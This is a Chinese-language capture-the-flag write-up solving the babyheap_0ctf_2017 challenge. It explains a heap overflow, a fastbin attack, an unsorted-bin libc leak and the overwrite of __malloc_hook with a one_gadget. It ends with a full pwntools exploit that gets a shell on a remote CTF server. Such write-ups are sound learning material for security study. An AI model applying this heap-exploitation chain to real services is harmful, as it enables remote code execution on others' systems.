首先checksec发现安全机制都打开了

![image-20210331150227780](https://static.hack1s.fun/images/2021/03/31/image-20210331150227780.png)

漏洞点位于填充数据的函数中

![image-20210331161345496](https://static.hack1s.fun/images/2021/03/31/image-20210331161345496.png)

这里在fill这个选项中虽然进行了长度判断，但是这个比较不是和chunk本身的大小进行比较，而是和用户输入的size比较，所以只要输入一个比较大的size就可以溢出chunk后面的内容

![image-20210425102119595](https://static.hack1s.fun/images/2021/04/24/image-20210425102119595.png)

按照double free做一下试试看

```python
a = malloc(0x38)
b = malloc(0x38)

free(a)
free(b)
free(a)
```

这时gdb调试看到

![image-20210425102803867](https://static.hack1s.fun/images/2021/04/24/image-20210425102803867.png)

tcachebins

这是因为链接的库文件不对，网上搜了之后安装了patchelf和glibc-all-in-one

```bash
patchelf --set-interpreter=~/glibc-all-in-one/ld.so.2 babyheap
patchelf --set-rpath=~/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ babyheap
```



之后就可以展开fastbin attack了

但是这个程序开启了Full RELRO和PIE

那么修改got表是不可能了，尝试修改`__free_hook`或`__malloc_hook`

首先我们需要泄漏出一个libc的地址，之后利用fastbin attack修改`__malloc_hook`为one_gadget的地址

泄漏libc地址的话可以使用unsortedbin leak



但是这个程序中分配内存时使用的是`calloc`而不是`malloc`

分配之后会清零，所以没办法简单的直接读出来



思路是：

- 首先free两个fastbin，记为a,b
- 申请一个unsortedbin，记为c
- 利用溢出修改第二次free的fastbin (b) 的fd，使其指向unsortedbin (c)
- 利用溢出修改unsortedbin的size，伪造成fastbin的大小
- malloc两次fastbin，申请到的空间分别是原本b、c所在的空间；这时同时有两个指针指向c
- 利用溢出修改unsortedbin的size，使其恢复为一个unsortedbin的大小；
- free掉unsortedbin
- 利用另一个fastbin的指针泄漏出unsortedbin中的fd和bk，即main_arena的地址



这里有一个注意点，虽然我们不知道堆的地址，但是由于CTF的程序运行时都是堆刚刚初始化的状态，第一个堆快的第8位应该是按0对齐的，所以我们修改fastbin时只修改第八位就可以指向unsortedbin

核心代码

```python
chunk_A = malloc(0x28)

chunk_eB = malloc(0x28)
chunk_B = malloc(0x28)

chunk_eC = malloc(0x28)
chunk_C = malloc(0x88)

chunk_D = malloc(0x28)
# avoid consolidate

free(chunk_A)
free(chunk_B)
fill(chunk_eB,49,p64(0)*5 + p64(0x31) + p8(0xc0))
# point to chunk_C
fill(chunk_eC,48,p64(0)*5 + p64(0x31))
# change size to a fastbin

malloc(0x28)
dup = malloc(0x28)
# point to chunk_C

fill(chunk_eC,48,p64(0)*5 + p64(0x91))
# change size back to unsortedbin

free(chunk_C)
```



执行这一段脚本

![image-20210429193311942](https://static.hack1s.fun/images/2021/04/29/image-20210429193311942.png)

可以看到unsotredbin中的fd和bk都指向了main_arena

那么我们就成功拿到了一个泄漏的libc地址

由于一般`__malloc_hook`与`main_arena`只差0x10的距离，我们直接相减就可以得到`__malloc_hook`的地址

![image-20210506143028227](https://static.hack1s.fun/images/2021/05/06/image-20210506143028227.png)

接下来就尝试覆盖`__malloc_hook`改为system函数或者是one_gadget



再一次利用fastbin_dup，这一次修改其中的fd指向`__malloc_hook`附近的fake chunk

![image-20210520113028864](../../../../Library/Application Support/typora-user-images/image-20210520113028864.png)

这里`0xaed`有一个可以用于伪造的地方

那么

```python
# get shell
chunk_E = malloc(0x68)
chunk_eF = malloc(0x38)
chunk_F = malloc(0x68)
free(chunk_E)
free(chunk_F)

payload = b'\x00'*0x38 + p64(0x71) + p64(malloc_hook-0x23)
# find_fake_fast
fill(chunk_eF,len(payload),payload)
```

这样之后再申请两次大小为0x68的chunk就可以获得一个在malloc_hook附近的chunk了

```python
malloc(0x68)
chunk = malloc(0x68)
fill(chunk,0x1b,b'\x00'*0x13 + p64(one))
```

在其中填上gap和one_gadget的地址，结束；

```python
#!/usr/bin/env python
from pwn import *
from LibcSearcher import *

elf = context.binary = ELF('./babyheap_0ctf_2017')

#context.log_level = 'debug'
#context.terminal = ['konsole','sh','-e']

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

#io = start()
io = remote('node3.buuoj.cn','28750')

def malloc(chunk_size):
    io.recvuntil('Command: ')
    io.sendline('1')
    io.recvuntil('Size: ')
    io.sendline(str(chunk_size))
    io.recvuntil('Allocate Index ')

    idx = io.recvline()[:-1]
    return int(idx)

def fill(idx,size,content):
    io.recvuntil('Command: ')
    io.sendline('2')

    io.recvuntil('Index: ')
    io.sendline(str(idx))

    io.recvuntil('Size: ')
    io.sendline(str(size))

    io.recvuntil('Content: ')
    io.sendline(content)

def free(idx):
    io.recvuntil('Command: ')
    io.sendline('3')

    io.recvuntil('Index: ')
    io.sendline(str(idx))

def dump(idx):
    io.recvuntil('Command: ')
    io.sendline('4')
    io.recvuntil('Index: ')
    io.sendline(str(idx))
    io.recvuntil('Content: ')

    return io.recv()
  
chunk_A = malloc(0x28)

chunk_eB = malloc(0x28)
chunk_B = malloc(0x28)

chunk_eC = malloc(0x28)
chunk_C = malloc(0x88)

chunk_D = malloc(0x28)

free(chunk_A)
free(chunk_B)

fill(chunk_eB,49,p64(0)*5+p64(0x31)+p8(0xc0))
fill(chunk_eC,48,p64(0)*5+p64(0x31))

malloc(0x28)
dup = malloc(0x28)

fill(chunk_eC,48,p64(0)*5+p64(0x91))
free(chunk_C)
io.recvuntil('Command: ')
io.sendline('4')
io.recvuntil('Index: ')
io.sendline(str(dup))
io.recvuntil('Content: \n')

fd = u64(io.recv(6).ljust(8,b'\x00'))
main_arena = fd-0x58
success("Main Arena's Address is "+hex(main_arena))

malloc_hook = main_arena-0x10
libc = LibcSearcher('__malloc_hook',malloc_hook)
libc_base = malloc_hook - libc.dump('__malloc_hook')
system = libc_base + libc.dump('system')
success("System's Address: "+hex(system))
one = libc_base +0x4526a
success("One Gadget's Address: "+hex(one))


# get shell
chunk_E = malloc(0x68)
chunk_eF = malloc(0x38)
chunk_F = malloc(0x68)
free(chunk_E)
free(chunk_F)

payload = b'\x00'*0x38 + p64(0x71) + p64(malloc_hook-0x23)
# find_fake_fast
fill(chunk_eF,len(payload),payload)

malloc(0x68)
chunk = malloc(0x68)
fill(chunk,0x1b,b'\x00'*0x13 + p64(one))
malloc(0x8)

io.interactive()
```

